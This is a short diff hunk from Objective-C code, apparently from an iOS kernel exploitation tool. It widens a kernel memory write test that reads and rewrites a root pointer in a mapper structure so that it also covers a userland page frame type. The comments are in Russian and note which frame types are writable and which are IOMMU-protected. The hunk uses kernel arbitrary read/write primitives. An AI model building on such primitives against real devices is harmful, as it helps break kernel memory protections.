@@ -5368,8 +5368,8 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
     GNOTE( [NSString stringWithFormat:@"  frame types: mapper=0x%x L1arr=0x%x L2=0x%x L3=0x%x (0x21=heap пишется, 0x17=IOMMU защищена)",
                ftMapper, ftL1arr, ftL2, ftL3]);
 
-    // 5. если mapper — heap: тест записи root-указателя (no-op: то же значение)
-    if (ftMapper == 0x21) {
+    // 5. если mapper — heap ИЛИ userland (0x0b тоже пишется!): тест записи root-указателя
+    if (ftMapper == 0x21 || ftMapper == 0x0b) {
         uint64_t orig = kp_rc_kread64(mapper + 0x30);
         kp_rc_kwrite64(mapper + 0x30, orig);
         uint64_t rb = kp_rc_kread64(mapper + 0x30);
